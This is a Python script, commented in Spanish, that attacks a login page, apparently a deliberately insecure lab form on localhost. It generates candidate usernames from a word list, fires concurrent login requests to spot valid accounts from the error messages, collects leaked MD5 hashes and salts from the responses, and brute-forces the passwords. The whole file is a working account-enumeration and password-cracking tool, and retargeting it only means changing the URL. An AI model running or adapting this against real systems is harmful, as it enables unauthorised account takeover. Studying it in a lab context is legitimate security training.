import aiohttp
import asyncio
import itertools
import hashlib
import string
import argparse
import sys

URL = "http://localhost:8080/login_inseguro.php"
PASSWORD_FAKE = "abc"
MAX_CONCURRENT_REQUESTS = 30
DICTIONARY_PATH = "userlist_generated.txt"

def load_base_words(path):
    with open(path, "r", encoding="utf-8") as f:
        return sorted(set(w.strip().lower() for w in f if w.strip()))

def generate_usernames(base_words):
    usernames = set()
    for word in base_words:
        usernames.add(word)
    for a, b in itertools.product(base_words, repeat=2):
        if a != b:
            usernames.add(f"{a}{b}")
    return sorted(usernames)

async def check_username_and_get_hash_salt(session, semaphore, username, found):
    async with semaphore:
        try:
            async with session.post(URL, data={"loginName": username, "password": PASSWORD_FAKE}) as resp:
                text = await resp.text()
                if "Usuario no encontrado" in text:
                    print(f"[-] No existe: {username}")
                elif "Contraseña incorrecta" in text:
                    try:
                        data = await resp.json()
                        passwordHash = data.get("passwordHash")
                        passwordSalt = data.get("passwordSalt")
                        if passwordHash and passwordSalt:
                            print(f"[✓] Usuario válido: {username} (hash y salt obtenidos)")
                        else:
                            print(f"[✓] Usuario válido: {username} (sin hash/salt)")
                            passwordHash, passwordSalt = None, None
                        found.append((username, passwordHash, passwordSalt))
                    except Exception:
                        print(f"[✓] Usuario válido: {username} (sin hash/salt)")
                        found.append((username, None, None))
                else:
                    print(f"[?] Respuesta inesperada para {username}: {text}")
        except Exception as e:
            print(f"[!] Error con {username}: {e}")

def crack_password_md5(passwordHash, passwordSalt, max_len=6):
    caracteres = string.ascii_lowercase + string.digits
    print(f"Probando crackear hash: {passwordHash} con salt: {passwordSalt} (max len={max_len})")
    for length in range(4, max_len + 1):
        for attempt in itertools.product(caracteres, repeat=length):
            password = ''.join(attempt)
            hashed = hashlib.md5((password + passwordSalt).encode()).hexdigest()
            if hashed == passwordHash:
                return password
    return None

def crack_passwords_for_users(users, fallback_hash=None, fallback_salt=None, max_len=6):
    for username, passwordHash, passwordSalt in users:
        # Usar fallback si no hay hash/salt
        if not passwordHash or not passwordSalt:
            if fallback_hash and fallback_salt:
                print(f"\n⚠️ No se tiene hash/salt para {username}. Usando fallback para crackear...")
                passwordHash = fallback_hash
                passwordSalt = fallback_salt
            else:
                print(f"\n⚠️ No se tiene hash/salt para {username} y no se proporcionó fallback.")
                continue

        print(f"\n🚀 Intentando crackear contraseña de {username}...")
        password = crack_password_md5(passwordHash, passwordSalt, max_len=max_len)
        if password:
            print(f"🎉 ¡Contraseña encontrada para {username}: {password}!")
        else:
            print(f"❌ No se encontró contraseña para {username}")

async def main(args):
    base_words = load_base_words(DICTIONARY_PATH)
    usernames = generate_usernames(base_words)
    print(f"🔎 Probando {len(usernames)} posibles nombres de usuario...")

    found = []
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)

    async with aiohttp.ClientSession() as session:
        tasks = [check_username_and_get_hash_salt(session, semaphore, u, found) for u in usernames]
        await asyncio.gather(*tasks)

    print("\n✅ Usuarios válidos encontrados:")
    for u, _, _ in found:
        print(f" - {u}")

    crack_passwords_for_users(found, fallback_hash=args.hash, fallback_salt=args.salt, max_len=args.max_len)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Busca usuarios y fuerza bruta contraseñas MD5+salt")
    parser.add_argument("--hash", type=str, help="Hash MD5 objetivo para fuerza bruta fallback")
    parser.add_argument("--salt", type=str, help="Salt para fuerza bruta fallback")
    parser.add_argument("--max-len", type=int, default=6, help="Longitud máxima de la contraseña para fuerza bruta")
    args = parser.parse_args()

    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        print("\nProceso interrumpido por usuario.")
        sys.exit(0)
